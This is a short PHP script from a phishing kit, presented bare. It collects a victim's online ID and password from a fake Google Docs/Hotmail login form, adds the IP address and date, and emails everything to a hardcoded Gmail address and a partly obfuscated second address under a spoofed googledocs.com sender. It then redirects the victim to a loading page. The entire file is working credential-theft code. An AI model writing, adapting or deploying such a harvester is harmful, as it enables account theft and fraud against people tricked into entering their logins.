<?

$adddate=date("D M d, Y g:i a");
$mesaegs ="php_info";$mesaegs ="@";
$ip = getenv("REMOTE_ADDR");
$mesaegs ="ymail";$mesaegs  =".com";
$message .= "---------=ReZulT=---------\n";
$message .= "Online ID: ".$_POST['x0r1']."\n";
$message .= "Password: ".$_POST['x0r2']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------=by Oza=---------\n";




$sent ="bababox2000@gmail.com";




$subject = "Googledocs | hotmail";
$headers = "From: Oza <Oza@googledocs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: loading.htm");
?>